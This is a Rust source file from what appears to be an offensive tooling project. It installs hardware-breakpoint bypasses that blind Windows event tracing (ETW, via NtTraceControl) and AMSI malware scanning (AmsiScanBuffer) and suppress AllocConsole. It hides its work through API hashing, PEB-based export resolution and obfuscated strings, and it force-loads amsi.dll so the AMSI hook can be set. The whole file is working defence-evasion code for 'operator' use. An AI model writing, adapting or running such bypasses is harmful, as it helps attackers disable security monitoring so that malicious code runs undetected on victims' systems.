//! HWBP-based patchless bypass installers. Each function returns an RAII
//! guard whose `Drop` impl removes the descriptor across all threads.
//!
//! Slot numbering convention used by the orchestrator:
//!   0 → ETW (NtTraceControl)
//!   1 → AMSI (AmsiScanBuffer)
//!   2 → exit-trap (RtlExitUserProcess) — installed lazily inside dispatch
//!   3 → AllocConsole

use crate::error::OrchestratorError;
use opsec_hwbp::HwbpEngine;

pub struct InstalledBypasses<'a> {
    pub etw: Option<opsec_hwbp::HwbpGuard<'a>>,
    pub amsi: Option<opsec_hwbp::HwbpGuard<'a>>,
    pub alloc_console: Option<opsec_hwbp::HwbpGuard<'a>>,
}

/// Install ETW, AMSI, and AllocConsole bypasses based on operator flags.
/// The exit-trap is installed by the dispatch code (it needs the cleanup
/// RIP/RSP captured immediately before invoke).
pub unsafe fn install(
    engine: &HwbpEngine,
    enable_amsi: bool,
    enable_etw: bool,
) -> Result<InstalledBypasses<'_>, OrchestratorError> {
    unsafe {
        let etw = if enable_etw {
            let ntdll_h = opsec_strcrypt::hash!("ntdll.dll");
            let exp_h = opsec_strcrypt::hash!("NtTraceControl");
            let target = opsec_peb::resolve_module(ntdll_h)
                .and_then(|m| opsec_peb::resolve_export(m, exp_h))
                .ok_or(OrchestratorError::PebResolve {
                    module_hash: ntdll_h,
                    export_hash: exp_h,
                })?;
            Some(engine.install_rip_ret(target as usize, 0)
                .map_err(OrchestratorError::Hwbp)?)
        } else {
            None
        };

        let amsi = if enable_amsi {
            ensure_amsi_loaded();
            Some(engine.install_amsi_set().map_err(OrchestratorError::Hwbp)?)
        } else {
            None
        };

        let k32_h = opsec_strcrypt::hash!("kernel32.dll");
        let acfn_h = opsec_strcrypt::hash!("AllocConsole");
        let alloc_console = opsec_peb::resolve_module(k32_h)
            .and_then(|m| opsec_peb::resolve_export(m, acfn_h))
            .and_then(|target| engine.install_rip_ret(target as usize, 3).ok());

        Ok(InstalledBypasses { etw, amsi, alloc_console })
    }
}

/// Force-load `amsi.dll` if not already present in the host process.
/// Required so `install_amsi_set` can resolve `AmsiScanBuffer` before the
/// CLR lazy-loads AMSI on its own.
unsafe fn ensure_amsi_loaded() {
    unsafe {
        if opsec_peb::resolve_module(opsec_strcrypt::hash!("amsi.dll")).is_some() {
            return;
        }
        let llh = opsec_strcrypt::hash!("LoadLibraryA");
        let load_fn = opsec_peb::resolve_module(opsec_strcrypt::hash!("kernelbase.dll"))
            .and_then(|m| opsec_peb::resolve_export(m, llh))
            .or_else(|| opsec_peb::resolve_module(opsec_strcrypt::hash!("kernel32.dll"))
                .and_then(|m| opsec_peb::resolve_export(m, llh)));
        if let Some(ll) = load_fn {
            type LoadLibA = unsafe extern "system" fn(*const u8) -> *mut core::ffi::c_void;
            let f: LoadLibA = core::mem::transmute(ll);
            let raw = opsec_strcrypt::obf!("amsi.dll");
            let src = raw.as_bytes();
            let mut buf = [0u8; 16];
            let n = src.len().min(buf.len() - 1);
            buf[..n].copy_from_slice(&src[..n]);
            f(buf.as_ptr());
        }
    }
}
